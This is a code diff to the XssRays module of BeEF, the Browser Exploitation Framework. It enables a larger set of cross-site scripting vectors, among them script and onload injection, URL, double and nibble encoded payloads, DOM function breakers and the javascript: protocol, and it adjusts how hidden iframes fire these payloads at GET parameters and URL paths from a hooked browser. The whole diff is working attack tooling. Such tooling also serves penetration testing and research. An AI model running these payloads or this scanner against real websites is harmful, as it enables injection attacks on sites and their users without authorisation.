@@ -49,20 +49,27 @@ beef.net.xssrays = {
     //browser-specific attack vectors available strings: ALL, FF, IE, S, C, O
     vectors: [
 
-//				  {input:"',XSS,'", name: 'Standard DOM based injection single', browser: 'ALL',url:true,form:true,path:true},
-//				  {input:'",XSS,"', name: 'Standard DOM based injection double', browser: 'ALL',url:true,form:true,path:true},
-//        {input: '\'><script>XSS<\/script>', name: 'Standard script injection single', browser: 'ALL',url:true,form:true,path:true},
-        {input: '"><script>XSS<\/script>', name: 'Standard script injection double', browser: 'ALL',url:true,form:true,path:true}, //,
-		{input:"' style=abc:expression(XSS) ' \" style=abc:expression(XSS) \"", name: 'Expression CSS based injection', browser: 'IE',url:true,form:true,path:true}
+//				  {input:"',XSS,'", name: 'Standard DOM based injection single quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'",XSS,"', name: 'Standard DOM based injection double quote', browser: 'ALL',url:true,form:true,path:true},
+//				  {input:'\'><script>XSS<\/script>', name: 'Standard script injection single quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'"><script>XSS<\/script>', name: 'Standard script injection double quote', browser: 'ALL',url:true,form:true,path:true}, //,
+//				  {input:'\'><body onload=\'XSS\'>', name: 'body onload single quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'"><body onload="XSS">', name: 'body onload double quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'%27%3E%3C%73%63%72%69%70%74%3EXSS%3C%2F%73%63%72%69%70%74%3E', name: 'url encoded single quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'%22%3E%3C%73%63%72%69%70%74%3EXSS%3C%2F%73%63%72%69%70%74%3E', name: 'url encoded double quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'%25%32%37%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45XSS%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45', name: 'double url encoded single quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'%25%32%32%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45XSS%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45', name: 'double url encoded double quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'%%32%35%%33%32%%33%32%%32%35%%33%33%%34%35%%32%35%%33%33%%34%33%%32%35%%33%37%%33%33%%32%35%%33%36%%33%33%%32%35%%33%37%%33%32%%32%35%%33%36%%33%39%%32%35%%33%37%%33%30%%32%35%%33%37%%33%34%%32%35%%33%33%%34%35XSS%%32%35%%33%33%%34%33%%32%35%%33%32%%34%36%%32%35%%33%37%%33%33%%32%35%%33%36%%33%33%%32%35%%33%37%%33%32%%32%35%%33%36%%33%39%%32%35%%33%37%%33%30%%32%35%%33%37%%33%34%%32%35%%33%33%%34%35', name: 'double nibble url encoded double quote', browser: 'ALL',url:true,form:true,path:true},
+//				  {input:"' style=abc:expression(XSS) ' \" style=abc:expression(XSS) \"", name: 'Expression CSS based injection', browser: 'IE',url:true,form:true,path:true}
 //				  {input:'" type=image src=null onerror=XSS " \' type=image src=null onerror=XSS \'', name: 'Image input overwrite based injection', browser: 'ALL',url:true,form:true,path:true},
 //				  {input:"' onload='XSS' \" onload=\"XSS\"/onload=\"XSS\"/onload='XSS'/", name: 'onload event injection', browser: 'ALL',url:true,form:true,path:true},
-//        {input:'\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=XSS>', name: 'Image injection HTML breaker', browser: 'ALL',url:true,form:true,path:true}
+//				  {input:'\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=XSS>', name: 'Image injection HTML breaker', browser: 'ALL',url:true,form:true,path:true},
 //				  {input:"'},XSS,function x(){//", name: 'DOM based function breaker single quote', browser: 'ALL',url:true,form:true,path:true},
-//				  {input:'"},XSS,function x(){//', name: 'DOM based function breaker double quote', browser: 'ALL',url:true,form:true,path:true},
-//				  {input:'\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3eXSS\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e', name: 'DOM based innerHTML injection', browser: 'ALL',url:true,form:true,path:true},
-//  				  {input:'javascript:XSS', name: 'Javascript protocol injection', browser: 'ALL',url:true,form:true,path:true},
-//  				  {input:'null,XSS//', name: 'Unfiltered DOM injection comma', browser: 'ALL',url:true,form:true,path:true},
-        //{input:'null\nXSS//', name: 'Unfiltered DOM injection new line', browser: 'ALL',url:true,form:true,path:true}
+				  {input:'"},XSS,function x(){//', name: 'DOM based function breaker double quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3eXSS\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e', name: 'DOM based innerHTML injection', browser: 'ALL',url:true,form:true,path:true},
+  				  {input:'javascript:XSS', name: 'Javascript protocol injection', browser: 'ALL',url:true,form:true,path:true},
+  				  {input:'null,XSS//', name: 'Unfiltered DOM injection comma', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'null\nXSS//', name: 'Unfiltered DOM injection new line', browser: 'ALL',url:true,form:true,path:true}
     ],
     uniqueID: 0,
     rays: [],
@@ -99,7 +106,7 @@ beef.net.xssrays = {
 
     // util function. Print string to the console only if the debug flag is on and the browser is not IE.
     printDebug:function(log) {
-        if (this.debug && !beef.browser.isIE()) {
+        if (this.debug && (!beef.browser.isIE6() && !beef.browser.isIE7() && !beef.browser.isIE8())) {
             console.log("[XssRays] " + log);
         }
     },
@@ -181,6 +188,13 @@ beef.net.xssrays = {
                 if (target.search.length > 0) {
                     target.search = target.search.slice(1);
                     target.search = target.search.split(/&|&amp;/);
+
+                    if(beef.browser.isIE() && target.pathname.charAt(0) != "/"){ //the damn IE doesn't contain the forward slash in pathname
+                       var pathname = "/" + target.pathname;
+                    }else{
+                        var pathname = target.pathname;
+                    }
+
                     var params = {};
                     for (var i = 0; i < target.search.length; i++) {
                         target.search[i] = target.search[i].split('=');
@@ -197,20 +211,20 @@ beef.net.xssrays = {
                         }
                         if (this.vectors[i].url) {
                             if (target.port == null || target.port == "") {
-                                beef.net.xssrays.printDebug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + target.pathname + "]");
-                                this.run(target.protocol + '//' + target.hostname + target.pathname, 'GET', this.vectors[i], params, true);//params
+                                beef.net.xssrays.printDebug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + pathname + "]");
+                                this.run(target.protocol + '//' + target.hostname + pathname, 'GET', this.vectors[i], params, true);//params
                             } else {
-                                beef.net.xssrays.printDebug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + target.pathname + "]");
-                                this.run(target.protocol + '//' + target.hostname + ':' + target.port + target.pathname, 'GET', this.vectors[i], params, true);//params
+                                beef.net.xssrays.printDebug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + pathname + "]");
+                                this.run(target.protocol + '//' + target.hostname + ':' + target.port + pathname, 'GET', this.vectors[i], params, true);//params
                             }
                         }
                         if (this.vectors[i].path) {
                             if (target.port == null || target.port == "") {
-                                beef.net.xssrays.printDebug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + target.pathname + "]");
-                                this.run(target.protocol + '//' + target.hostname + target.pathname, 'GET', this.vectors[i], null, true);//paths
+                                beef.net.xssrays.printDebug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + pathname + "]");
+                                this.run(target.protocol + '//' + target.hostname + pathname, 'GET', this.vectors[i], null, true);//paths
                             } else {
-                                beef.net.xssrays.printDebug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + target.pathname + "]");
-                                this.run(target.protocol + '//' + target.hostname + ':' + target.port + target.pathname, 'GET', this.vectors[i], null, true);//paths
+                                beef.net.xssrays.printDebug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + pathname + "]");
+                                this.run(target.protocol + '//' + target.hostname + ':' + target.port + pathname, 'GET', this.vectors[i], null, true);//paths
                             }
                         }
                     }
@@ -365,11 +379,20 @@ beef.net.xssrays = {
             /*
              * ++++++++++ create the iFrame that will contain the attack vector ++++++++++
              */
-            var iframe = document.createElement('iframe');
+            if(beef.browser.isIE()){
+                try {
+                    var iframe = document.createElement('<iframe name="ray'+Math.random().toString() +'">');
+                } catch (e) {
+                    var iframe = document.createElement('iframe');
+                    iframe.name = 'ray' + Math.random().toString();
+                }
+            }else{
+                var iframe = document.createElement('iframe');
+                iframe.name = 'ray' + Math.random().toString();
+            }
             iframe.style.display = 'none';
             iframe.id = 'ray' + beef.net.xssrays.uniqueID;
             iframe.time = beef.net.xssrays.timestamp();
-            iframe.name = 'ray' + Math.random().toString();
 
             if (method === 'GET') {
                 if(beef.browser.isC() || beef.browser.isS()){
@@ -433,11 +456,13 @@ beef.net.xssrays = {
                 numOfConnections++;
                 //beef.net.xssrays.printDebug("runJobs parseInt(this.timestamp()) [" + parseInt(beef.net.xssrays.timestamp()) + "], parseInt(iframe.time) [" + parseInt(iframe.time) + "]");
                 if (parseInt(beef.net.xssrays.timestamp()) - parseInt(iframe.time) > 5) {
-                    if (iframe) {
-                        beef.net.xssrays.complete();
-                        beef.net.xssrays.printDebug("RunJobs cleaning up iFrame [" + iframe.id + "]");
-                        document.body.removeChild(iframe);
-                    }
+                    try{
+                        if (iframe) {
+                            beef.net.xssrays.complete();
+                            beef.net.xssrays.printDebug("RunJobs cleaning up iFrame [" + iframe.id + "]");
+                            document.body.removeChild(iframe);
+                        }
+                    }catch(e){beef.net.xssrays.printDebug("Exception [" + e.toString() + "] when cleaning iframes.")}
                 }
             }
 
